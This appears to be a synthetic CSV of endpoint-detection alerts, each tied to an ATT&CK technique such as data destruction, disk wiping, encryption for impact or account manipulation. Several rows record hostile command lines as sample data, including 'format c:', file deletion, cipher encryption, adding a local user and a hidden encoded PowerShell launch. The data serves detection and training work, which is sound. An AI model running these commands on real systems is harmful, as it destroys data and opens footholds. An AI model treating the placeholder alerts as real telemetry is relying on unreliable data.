AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName
01234567-89ab-cdef-0123-456789abcdef,2022-10-15T12:30:00.0000000Z,2023-03-10T15:30:00Z,high,AccountManipulation,newAlert,Account Manipulation,An attempt was made to add a user account to the local Administrators group on a device,"['Block or quarantine the affected device', 'Investigate the source and destination of the activity', 'Reset the passwords for any accounts that may have been compromised']","{'provider': 'Microsoft Defender for Endpoint', 'providerVersion': '1.0'}","{'affectedEntities': [{'affectedEntityType': 'Machine', 'machine': {'id': '12345678-9abc-def0-1234-56789abcdef0', 'hostName': 'WIN10-PC', 'osPlatform': 'Windows 10 Enterprise', 'osVersion': '1909', 'machineGroup': {'id': '87654321-ba98-fedc-7654-3210fedcba98', 'name': 'Marketing', 'displayName': 'Marketing'}}}], 'eventTime': '2022-10-15T12:30:00.0000000Z', 'eventName': 'Local group membership changes', 'eventSeverity': 'High', 'actionTaken': 'Blocked', 'operationName': 'Add Local Group Member', 'user': {'domainName': 'MYDOMAIN', 'userName': 'jdoe', 'sid': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'email': 'jdoe@example.com'}, 'target': {'targetType': 'User', 'targetUserName': 'jsmith', 'targetUserSid': 'S-1-5-21-1234567890-1234567890-1234567890-1002'}, 'initiator': {'initiatorType': 'User', 'initiatorUserName': 'admin', 'initiatorSid': 'S-1-5-21-1234567890-1234567890-1234567890-500'}, 'additionalData': [{'name': 'New Member Name', 'value': 'jsmith'}, {'name': 'Group Name', 'value': 'Administrators'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
55554673,,2023-03-10T10:30:00Z,,,,BITS Jobs,APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.,,,,Endpoint Detection and Response,High,BITS Jobs,hostname,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job /download /priority normal http://example.com/file.txt C:\file.txt,explorer.exe,C:\Windows\explorer.exe,File system monitoring and behavioral analysis,"['Terminate the process and remove any associated artifacts.', 'Investigate the source and destination of the BITS job.', 'Check for other suspicious activity on the endpoint and the network.', 'Update endpoint security software and monitor for any further activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
789012,,2023-03-08T15:30:00Z,high,endpoint,,Communication Through Removable Media,A file transfer was initiated form a removed media drive (USB),,,,,,Communication Through Removable Media,,,,,,,,,EDR,Exfiltration,USB Drive,file transfer,confidential.docx,3.5MB,D:\confidential.docx,C:\Users\user1\Documents\confidential.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-T1609,,,,,,Container Administration Command Execution Detected,"In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as docker exec to execute a command within a running container.",,,,,,,,,,,,,,,,,,,,,,,High,Container Administration Command,"{'StartTime': '2022-03-15T14:30:00Z', 'EndTime': '2022-03-15T14:31:00Z', 'Source': {'HostName': 'Endpoint-001', 'IPAddress': '192.168.1.100'}, 'Destination': {'HostName': 'Container-001', 'IPAddress': '192.168.1.200'}, 'EventType': 'CommandExecution', 'Command': 'docker exec -it <container_id> /bin/bash'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
44555555,,,,,,Custom Script,A custom script was detected running on a machine that was performing internal reconnaissance,,,,,,,,,,,,,,,,,,,,,,,3,,,EDR,12345678-9abc-def0-1234-56789abcdef0,Script-based,EDR1234567890123456,2022-02-28T10:30:00.000Z,"{'AffectedEntities': [{'MachineId': '12345678-9abc-def0-1234-56789abcdef0', 'MachineName': 'SERVER-123', 'DomainName': 'COMPANY.LOCAL', 'IPAddress': '10.0.0.1', 'OSPlatform': 'Windows', 'OSBuild': '10.0.19043.1415', 'OSVersion': '20H2', 'ProcessName': 'powershell.exe', 'ProcessCommandLine': 'powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\internal_reconnaissance.ps1', 'ProcessId': 1234, 'ParentProcessName': 'cmd.exe', 'ParentProcessCommandLine': 'cmd.exe /c C:\\scripts\\internal_reconnaissance.bat', 'ParentProcessId': 5678, 'DetectionSource': 'MachineLearning'}], 'ScriptName': 'internal_scan.ps1', 'ScriptHash': '1234567890123456789012345678901234567890', 'ScriptFolderPath': 'C:\\scripts\\'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
453333,,2022-03-07T16:57:35.0000000Z,,,,Data Destruction,Data destruction activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,3,,,,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Destruction', 'AlertId': '12345', 'ThreatName': 'Data Destruction', 'Severity': 'High', 'TimestampUtc': '2022-03-07T16:57:35.0000000Z', 'Tactic': 'Impact', 'Technique': 'Data Destruction', 'AffectedEntities': {'File': [{'Path': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'Hash': '1234567890ABCDEF1234567890ABCDEF12345678', 'CreatedTimeUtc': '2022-03-06T16:57:35.0000000Z', 'ModifiedTimeUtc': '2022-03-06T16:57:35.0000000Z'}]}, 'CommandLine': 'cmd /c del C:\\Users\\example-user\\Documents\\example-file.txt'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0944444,,2023-03-08T09:00:00Z,,,,Data Encoding,Adversaries may encode data to make the content of command and control traffic more difficult to detect.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,Endpoint,,,,,,"{'ProcessName': 'notepad.exe', 'ProcessPath': 'C:\\Windows\\system32\\notepad.exe', 'CommandLine': 'notepad.exe C:\\Users\\User1\\Desktop\\encoded.txt', 'ParentProcessName': 'explorer.exe', 'ParentProcessPath': 'C:\\Windows\\explorer.exe', 'EncodingType': 'Base64', 'EncodedData': 'SGVsbG8gV29ybGQh'}","{'Hostname': 'Endpoint1', 'IPAddress': '192.168.1.10', 'MACAddress': '00-0C-29-56-A7-34', 'OS': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3345678,,2022-03-08T15:12:30.0000000Z,,,,Data Encrypted,Data encryption activity for impact was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,3,,,Behavior,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Encrypted for Impact', 'AlertId': '12345', 'ThreatName': 'Data Encrypted for Impact', 'Severity': 'High', 'TimestampUtc': '2022-03-08T15:12:30.0000000Z', 'MITRE': {'Tactic': ['Impact'], 'Technique': [{'Id': 'T1486', 'Name': 'Data Encrypted for Impact'}]}, 'AffectedEntities': {'File': [{'Path': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'Hash': '1234567890ABCDEF1234567890ABCDEF12345678', 'CreatedTimeUtc': '2022-03-08T14:34:10.0000000Z', 'ModifiedTimeUtc': '2022-03-08T14:34:10.0000000Z'}]}, 'CommandLine': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33567890,,2022-03-07T12:30:00Z,,,,Data Transfer Size Limits,Data transfer size limits were exceeded on endpoint. This approach may be used to avoid triggering network data transfer threshold alerts.,,,,,,Data Transfer Size Limits,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,Endpoint,123456789,ABCDEF1234567890,"[{'EntityName': 'Endpoint001', 'EntityType': 'Endpoint', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10', 'UserName': 'User001'}]",Exfiltration,Exfiltration,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234,,2023-03-10T10:00:00Z,,,,Deploy Container,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,example.com,/usr/bin/docker,docker,docker run malicious/image,f1ef997989e37c17eb2a12d56a9ac05d,098f6bcd4621d373cade4e832627b4f6,192.168.1.100,john.doe,5678,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234,,2023-03-10T12:00:00Z,High,Endpoint Detection and Response,,Direct Volume Access,Adversaries may directly access a volume to bypass file access controls and file system monitoring.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,MyComputer,192.168.1.100,Windows 10,123,cmd.exe /c net user test test123 /add,Direct,Write,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
934445,,2022-03-20T15:45:00Z,,,,Potential disk wiping activity detected,dversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources.,,,,,,,,,,,,cmd /c format c:,,,,,,,,,,,High,,,Behavior,,Disk Wipe,,,,,,,,EDR,,,,,,,C:\Windows\System32\cmd.exe,cmd.exe,,,,,user123,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-20T15:40:00Z,explorer.exe,explorer.exe,2022-03-20T15:30:00Z,example-device2,789012,Windows,10.0.19042,user456,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
098888,,2022-03-06T14:35:00Z,,,,Drive-by Compromise Detected,This alert fires when a drive-by compromise attempt is detected on an endpoint.,,,,Malware,,,,,,,,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",,"['Isolate the affected host immediately', 'Scan the host with an antivirus or EDR tool', 'Investigate the network traffic and identify the source of the attack']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,chrome.exe,,ab1234567890,cdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,Host,COMPANY-PC01,Windows 10,"['https://attack.mitre.org/techniques/T1189/', 'https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/drive-by-compromise']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9989898,,2022-03-08T14:32:47Z,,,,Denial of Service,Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.,,,,,High,,,,,,,cmd.exe /c ping -n 10000 127.0.0.1,,,,,,,,,,,,,,,,,,,,,,,,Behavior monitoring,,,,,,,,cmd.exe,,,,192.168.1.101,acme\jdoe,1224,,,,,,,,,,,,,,,,,,,,,,,,,,"['Delivery', 'Exploitation']",acme.local,WIN10-PC,https://securitycenter.windows.com/alert/1234567890,Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
111235,,2023-03-08T12:00:00.000000Z,,,,Exfiltration Over Alternative Protocol,"This alert is triggered when an adversary attempts to exfiltrate data using a protocol or service that is not typically used for this purpose, such as DNS or ICMP, using a command-line interface.",,,,,,,,,,,,,Behavior Monitoring,,,,,,,,,,High,,,,,Data Exfiltration,,,,,,,,,,,,,,,,,nslookup example.com 8.8.8.8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02049090,,2022-03-10T15:30:00Z,,,,Exploit Public-Facing Application,An attempt was made to exploit a public-facing application on the endpoint.,,,,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,High,Chrome,,ThreatDetection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft,Defender for Endpoint,C:\Program Files (x86)\Google\Chrome\Application\chrome.exe,5C6FCC7895CA5A218D8E3A9FDF56DEA1,HTTPS,192.168.1.100,54678.0,198.51.100.1,443.0,example.com,https://example.com/login,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030406fy,,2022-06-01T09:17:23Z,,,,Exploitation for Client Execution,Exploitation for Client Execution was detected on COMPANY-PC-01. The process 'cmd.exe' was launched with the following command line arguments: '/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....'.,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand JAB3AD4.....,,2a725f4d3d3dc6f3251a852f7686e8c6d7b6c98f17a0b0a51d6409aa9c32b327,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,Review the process and the associated arguments to determine if this was a legitimate action or if further investigation is needed. Consider blocking or restricting the use of Powershell or other scripting languages where appropriate.,,,,,,,,,,,,,123456,COMPANY-PC-01,C:\Windows\explorer.exe,C:\Windows\system32\cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020490,,2023-03-10T12:00:00Z,,,,Exploitation for Defense,"dversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",,,,,,Exploitation for Defense Evasion,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\cmd.exe,cmd.exe,cmd.exe /c echo hello world,,,192.168.1.100,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,TCP,,,,,,,,,,,,Endpoint,server01,admin,Windows,4444,Blocked,Exploit detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020304,,2022-04-01T14:30:00Z,,,,External Remote Services Connection,A connection to an external remote service has been detected.,,,,,,,,,,,,"explorer.exe /root,C:\Windows\system32",,"['Block the connection to the external remote service.', 'Investigate the process and parent process to determine if they are legitimate.']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,cmd.exe,cmd.exe /c dir,,,,,,,,,,,,,,,,,,,,TCP,,,10.0.0.2,8080,,,,,,C:\Windows\system32\cmd.exe,C:\Windows\explorer.exe,,,,,,,,1234,5678,Outbound,Unknown,Unknown,"['8080', '8443']",10.0.0.2,,http://10.0.0.2:8080,,Unknown,Unknown,Unknown,Unknown,Unknown,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020405,,2023-03-10T13:00:00Z,,,,Permissions Modification,Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.,,,,,,File and Directory Permissions Modification,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\config\SAM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,workstation01,user01,,,Blocked,Unauthorized file permission change,,,,,,,,,,,,,,,,SYSTEM,Full Control,Read-only,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
032040f06,,2022-03-06T09:18:56Z,,,,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.",,,,,,,,,,,,"cmd.exe /c rundll32.exe bios.dll,CorruptFirmware",EDR,,,,,,,,,,High,,,,12345,Firmware Attack,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0000w0r,,,,,,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access.",,,,,,,,,,,,,,"['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']",,,,,,,,,High,,,EndpointDetection,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EventType,Equals,HardwareAddition,"['T1200', 'Hardware Additions', 'Endpoint 